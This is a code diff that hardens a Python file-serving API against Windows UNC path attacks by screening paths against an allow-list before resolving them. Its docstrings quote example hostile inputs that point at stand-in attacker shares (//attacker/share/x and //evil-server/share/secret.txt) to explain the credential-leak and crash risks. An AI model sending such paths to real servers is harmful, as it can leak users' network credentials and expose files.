@@ -515,6 +515,53 @@ def _is_windows_path_allowed(resolved: Path) -> bool:
     return True
 
 
+def _lexical_path(p: Path) -> Path:
+    """Absolute, with `..` collapsed, without asking the filesystem anything.
+
+    GetFullPathNameW (what abspath uses on Windows) is a pure string
+    operation — it never verifies the path exists, and never goes to the
+    network for a UNC path.
+    """
+    try:
+        return Path(os.path.abspath(p))
+    except (OSError, ValueError):
+        return Path(os.path.normpath(str(p)))
+
+
+def safe_resolve(raw) -> Path:
+    """`expanduser().resolve()` that can't be steered into network I/O or blow up.
+
+    Two Windows hazards, and the plain idiom walks into both:
+
+    1. Canonicalizing a UNC path makes Windows contact the host — offering
+       the logged-in user's credentials to do it. Every caller resolved
+       BEFORE consulting the allow-list, so a request for
+       //attacker/share/x reached out to `attacker` and stalled ~3s before
+       anything decided the path was forbidden. Screening lexically first
+       closes that; the denial now costs no packets.
+
+    2. `resolve()` is nominally non-strict, but ntpath only swallows a fixed
+       set of errors and ERROR_NETNAME_DELETED isn't among them, so an
+       unreachable share raises out of routes that catch only
+       PermissionError. Observed live on the Windows VM against
+       /api/file?path=//evil-server/share/secret.txt:
+           OSError: [WinError 64] The specified network name is no longer
+           available: '\\\\evil-server\\share\\secret.txt'
+       — a 500 with a stack trace where a 403 belonged.
+
+    Denied and unresolvable paths come back lexically normalized rather than
+    raw, so `..` is still collapsed and the caller's containment check stays
+    honest; it just never touches the filesystem to get there.
+    """
+    p = Path(raw).expanduser()
+    if sys.platform == "win32" and not _is_windows_path_allowed(p):
+        return _lexical_path(p)
+    try:
+        return p.resolve()
+    except OSError:
+        return _lexical_path(p)
+
+
 def is_path_allowed_for_read(path: Path) -> bool:
     """
     Allow anywhere on the filesystem except the kernel-special trees above.
@@ -523,7 +570,11 @@ def is_path_allowed_for_read(path: Path) -> bool:
     its OS user can touch, so this doesn't broaden actual access beyond what
     the user already has via their shell.
     """
-    resolved = path.resolve()
+    # Screen before resolving, not after: see safe_resolve. A gate that
+    # resolves first has already made the call it exists to prevent.
+    if sys.platform == "win32" and not _is_windows_path_allowed(path):
+        return False
+    resolved = safe_resolve(path)
     if sys.platform == "win32":
         return _is_windows_path_allowed(resolved)
     return not any(
@@ -550,7 +601,7 @@ def resolve_work_dir(cwd: str = None) -> Path:
     Raises HTTPException(403) for the kernel-special trees only.
     """
     from fastapi import HTTPException
-    work_dir = Path(cwd).expanduser().resolve() if cwd else Path.cwd()
+    work_dir = safe_resolve(cwd) if cwd else Path.cwd()
     if not is_path_allowed(work_dir):
         raise HTTPException(status_code=403, detail=PATH_DENIED_DETAIL)
     return work_dir
